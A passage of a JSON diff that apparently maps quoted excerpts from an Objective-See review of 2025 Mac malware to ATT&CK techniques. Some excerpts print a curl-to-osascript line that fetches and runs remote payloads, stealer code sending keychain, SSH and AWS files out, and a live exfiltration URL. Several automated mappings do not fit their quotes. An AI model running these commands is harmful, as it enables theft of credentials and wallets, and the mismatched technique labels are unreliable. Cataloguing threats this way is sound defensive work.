+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1036.005",
+        "name": "Masquerading: Match Legitimate Resource Name or Location",
+        "parent_id": "T1036",
+        "url": "https://attack.mitre.org/techniques/T1036/005"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "medium",
+      "description": "“- FileMonitor Monitors file-system activity (such as file creation, modification, and deletion) and provides detailed event data.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1070.006",
+        "name": "Indicator Removal: Timestomp",
+        "parent_id": "T1070",
+        "url": "https://attack.mitre.org/techniques/T1070/006"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "low",
+      "description": "“Unit 42 dubbed the resulting loader RN Loader.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1218.011",
+        "name": "System Binary Proxy Execution: Rundll32",
+        "parent_id": "T1218",
+        "url": "https://attack.mitre.org/techniques/T1218/011"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "medium",
+      "description": "“At its core, that script retrieves and executes several additional payloads: nohup curl -fsSL https://67e5143a9ca7d2240c137ef80f2641d6.pages.dev/054e6893413402d220f5d7db8ef24af0.aspx | osascript >/dev/null 2>&1 & sleep 1 nohup curl -fsSL…” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        },
+        {
+          "id": "TA0007",
+          "name": "Discovery",
+          "order": 9,
+          "shortname": "discovery",
+          "url": "https://attack.mitre.org/tactics/TA0007"
+        }
+      ],
+      "technique": {
+        "id": "T1497",
+        "name": "Virtualization/Sandbox Evasion",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1497"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "low",
+      "description": "“18322 ./NightPaw 127.0.0.1 666 R From this exchange, we can see that NightPaw sends basic host telemetry during check in, including the system hostname, current user name, hardware architecture, macOS and kernel version, and details about its own execution context such as…” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1564.003",
+        "name": "Hide Artifacts: Hidden Window",
+        "parent_id": "T1564",
+        "url": "https://attack.mitre.org/techniques/T1564/003"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "high",
+      "description": "“To access sensitive user data, most stealers rely on social engineering prompts, and Kitty is no exception.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1684",
+        "name": "Social Engineering",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1684"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "medium",
+      "description": "“In this case, Unit 42 noted an approach that aligned with this pattern, revolving around coding challenges as part of a fake hiring process. \"[The attack] began by impersonating recruiters on LinkedIn and engaging with potential targets, sending them a benign PDF with a job…” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1684.001",
+        "name": "Social Engineering: Impersonation",
+        "parent_id": "T1684",
+        "url": "https://attack.mitre.org/techniques/T1684/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "medium",
+      "description": "“It is also worth noting that ChillyHell was originally signed and notarized by Apple, though both the notarization and its code signing certificate have since been revoked: Persistence: Launch item (agent or daemon), shell profile injection ChillyHell supports three distinct…” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0112",
+          "name": "Defense Impairment",
+          "order": 7,
+          "shortname": "defense-impairment",
+          "url": "https://attack.mitre.org/tactics/TA0112"
+        }
+      ],
+      "technique": {
+        "id": "T1553.002",
+        "name": "Subvert Trust Controls: Code Signing",
+        "parent_id": "T1553",
+        "url": "https://attack.mitre.org/techniques/T1553/002"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "high",
+      "description": "“- Keylogging: uses the CGEventTapCreate API” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0006",
+          "name": "Credential Access",
+          "order": 8,
+          "shortname": "credential-access",
+          "url": "https://attack.mitre.org/tactics/TA0006"
+        },
+        {
+          "id": "TA0009",
+          "name": "Collection",
+          "order": 11,
+          "shortname": "collection",
+          "url": "https://attack.mitre.org/tactics/TA0009"
+        }
+      ],
+      "technique": {
+        "id": "T1056.001",
+        "name": "Input Capture: Keylogging",
+        "parent_id": "T1056",
+        "url": "https://attack.mitre.org/techniques/T1056/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "medium",
+      "description": "“- Phishes the user’s password: Displays a fake “Please enter your password to continue” dialog, then validates the entered value locally using dscl ... -authonly.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0006",
+          "name": "Credential Access",
+          "order": 8,
+          "shortname": "credential-access",
+          "url": "https://attack.mitre.org/tactics/TA0006"
+        },
+        {
+          "id": "TA0009",
+          "name": "Collection",
+          "order": 11,
+          "shortname": "collection",
+          "url": "https://attack.mitre.org/tactics/TA0009"
+        }
+      ],
+      "technique": {
+        "id": "T1056.002",
+        "name": "Input Capture: GUI Input Capture",
+        "parent_id": "T1056",
+        "url": "https://attack.mitre.org/techniques/T1056/002"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "high",
+      "description": "“Jamf assesses that this module likely targets Kerberos based authentication, based on observed artifacts such as wordlists and brute force behavior.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0006",
+          "name": "Credential Access",
+          "order": 8,
+          "shortname": "credential-access",
+          "url": "https://attack.mitre.org/tactics/TA0006"
+        }
+      ],
+      "technique": {
+        "id": "T1110",
+        "name": "Brute Force",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1110"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "high",
+      "description": "“The presence of ModuleSUBF is particularly notable, as its functions explicitly support enumerating local user accounts, downloading wordlists, performing password cracking, and exfiltrating results.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0006",
+          "name": "Credential Access",
+          "order": 8,
+          "shortname": "credential-access",
+          "url": "https://attack.mitre.org/tactics/TA0006"
+        }
+      ],
+      "technique": {
+        "id": "T1110.002",
+        "name": "Brute Force: Password Cracking",
+        "parent_id": "T1110",
+        "url": "https://attack.mitre.org/techniques/T1110/002"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "medium",
+      "description": "“However, recent years have shown that stealer infections are frequently a precursor to far more damaging attacks: If you’re interested in the types of data that macOS stealers commonly target, SentinelOne researcher Phil Stokes has written an excellent post on the topic:…” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0006",
+          "name": "Credential Access",
+          "order": 8,
+          "shortname": "credential-access",
+          "url": "https://attack.mitre.org/tactics/TA0006"
+        }
+      ],
+      "technique": {
+        "id": "T1539",
+        "name": "Steal Web Session Cookie",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1539"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "high",
+      "description": "“Points Ledger Live to an attacker-controlled endpoint, likely to exfiltrate wallet data (seed phrases) or serve malicious configuration Reads the file at ~/Library/Application Support/Ledger Live/app.json Replaces or modifies the data.endpoint object with attacker-supplied…” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0006",
+          "name": "Credential Access",
+          "order": 8,
+          "shortname": "credential-access",
+          "url": "https://attack.mitre.org/tactics/TA0006"
+        }
+      ],
+      "technique": {
+        "id": "T1552.004",
+        "name": "Unsecured Credentials: Private Keys",
+        "parent_id": "T1552",
+        "url": "https://attack.mitre.org/techniques/T1552/004"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "medium",
+      "description": "“- “Mac.c stealer evolves into MacSync: Now with a backdoor” - MoonLock Labs” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0006",
+          "name": "Credential Access",
+          "order": 8,
+          "shortname": "credential-access",
+          "url": "https://attack.mitre.org/tactics/TA0006"
+        }
+      ],
+      "technique": {
+        "id": "T1555",
+        "name": "Credentials from Password Stores",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1555"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "low",
+      "description": "“- Core stealer logic: send_file('keychain', os.path.join(home_dir, 'Library', 'Keychains', 'login.keychain-db')) send_directory('home/ssh', 'ssh', os.path.join(home_dir, '.ssh'), True) send_directory('home/aws', 'aws', os.path.join(home_dir, '.aws'), True)…” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0006",
+          "name": "Credential Access",
+          "order": 8,
+          "shortname": "credential-access",
+          "url": "https://attack.mitre.org/tactics/TA0006"
+        }
+      ],
+      "technique": {
+        "id": "T1555.001",
+        "name": "Credentials from Password Stores: Keychain",
+        "parent_id": "T1555",
+        "url": "https://attack.mitre.org/techniques/T1555/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "high",
+      "description": "“This includes the current user’s credentials, hostname, hardware details, a list of running processes, and installed applications.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0007",
+          "name": "Discovery",
+          "order": 9,
+          "shortname": "discovery",
+          "url": "https://attack.mitre.org/tactics/TA0007"
+        }
+      ],
+      "technique": {
+        "id": "T1057",
+        "name": "Process Discovery",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1057"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "medium",
+      "description": "“Proofpoint researchers note that the collected data is added to folders in the user’s home directory and then exfiltrated to askforupdate.org.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0007",
+          "name": "Discovery",
+          "order": 9,
+          "shortname": "discovery",
+          "url": "https://attack.mitre.org/tactics/TA0007"
+        }
+      ],
+      "technique": {
+        "id": "T1083",
+        "name": "File and Directory Discovery",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1083"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "high",
+      "description": "“Beyond browser data, Kitty also targets Exodus cryptocurrency wallets.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0007",
+          "name": "Discovery",
+          "order": 9,
+          "shortname": "discovery",
+          "url": "https://attack.mitre.org/tactics/TA0007"
+        }
+      ],
+      "technique": {
+        "id": "T1217",
+        "name": "Browser Information Discovery",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1217"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "high",
+      "description": "“As its name suggests, it targets cryptocurrency wallets.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0007",
+          "name": "Discovery",
+          "order": 9,
+          "shortname": "discovery",
+          "url": "https://attack.mitre.org/tactics/TA0007"
+        }
+      ],
+      "technique": {
+        "id": "T1518",
+        "name": "Software Discovery",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1518"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "medium",
+      "description": "“A simple workaround is to run File Monitor from iTerm2.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0009",
+          "name": "Collection",
+          "order": 11,
+          "shortname": "collection",
+          "url": "https://attack.mitre.org/tactics/TA0009"
+        }
+      ],
+      "technique": {
+        "id": "T1005",
+        "name": "Data from Local System",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1005"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "low",
+      "description": "“- Collects and stages user data: Creates a randomized working directory under /tmp/, then copies files smaller than 100 KB from the user’s Desktop, Documents, and Downloads directories.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0009",
+          "name": "Collection",
+          "order": 11,
+          "shortname": "collection",
+          "url": "https://attack.mitre.org/tactics/TA0009"
+        }
+      ],
+      "technique": {
+        "id": "T1074.001",
+        "name": "Data Staged: Local Data Staging",
+        "parent_id": "T1074",
+        "url": "https://attack.mitre.org/techniques/T1074/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "high",
+      "description": "“It connects to its command and control server and begins capturing screenshots: 7/11: What we did not expect to see here, is the ability to capture and send screenshots.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0009",
+          "name": "Collection",
+          "order": 11,
+          "shortname": "collection",
+          "url": "https://attack.mitre.org/tactics/TA0009"
+        }
+      ],
+      "technique": {
+        "id": "T1113",
+        "name": "Screen Capture",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1113"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "medium",
+      "description": "“Download: Koi Stealer (password: infect3d)” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0009",
+          "name": "Collection",
+          "order": 11,
+          "shortname": "collection",
+          "url": "https://attack.mitre.org/tactics/TA0009"
+        }
+      ],
+      "technique": {
+        "id": "T1115",
+        "name": "Clipboard Data",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1115"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "medium",
+      "description": "“Again, here are some relevant snippets from the stealer’s Python code:” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0009",
+          "name": "Collection",
+          "order": 11,
+          "shortname": "collection",
+          "url": "https://attack.mitre.org/tactics/TA0009"
+        }
+      ],
+      "technique": {
+        "id": "T1213.005",
+        "name": "Data from Information Repositories: Messaging Applications",
+        "parent_id": "T1213",
+        "url": "https://attack.mitre.org/techniques/T1213/005"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "low",
+      "description": "“- Clipboard monitoring: uses a polling loop to read from the system pasteboard This information is then sent to the attacker’s command and control server.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0009",
+          "name": "Collection",
+          "order": 11,
+          "shortname": "collection",
+          "url": "https://attack.mitre.org/tactics/TA0009"
+        }
+      ],
+      "technique": {
+        "id": "T1560",
+        "name": "Archive Collected Data",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1560"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "medium",
+      "description": "“- Packages and uploads: Archives the staged data into a ZIP file and uploads it to https://goldenticketsshop.com/api/grabber, including metadata such as hwid, wid, and user, before deleting the local artifacts.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0009",
+          "name": "Collection",
+          "order": 11,
+          "shortname": "collection",
+          "url": "https://attack.mitre.org/tactics/TA0009"
+        }
+      ],
+      "technique": {
+        "id": "T1560.001",
+        "name": "Archive Collected Data: Archive via Utility",
+        "parent_id": "T1560",
+        "url": "https://attack.mitre.org/techniques/T1560/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "medium",
+      "description": "“Core networking and HTTP routines, such as QueryHTTP, DNSInit, and GetFile, combined with a persistent execution loop (mainCycle), indicate a long running implant that maintains regular command and control communication.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0011",
+          "name": "Command and Control",
+          "order": 12,
+          "shortname": "command-and-control",
+          "url": "https://attack.mitre.org/tactics/TA0011"
+        }
+      ],
+      "technique": {
+        "id": "T1071.001",
+        "name": "Application Layer Protocol: Web Protocols",
+        "parent_id": "T1071",
+        "url": "https://attack.mitre.org/techniques/T1071/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "low",
+      "description": "“RN Loader is a cross platform Python implant that beacons to a command and control server every 20 seconds, sending OS fingerprinting data.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
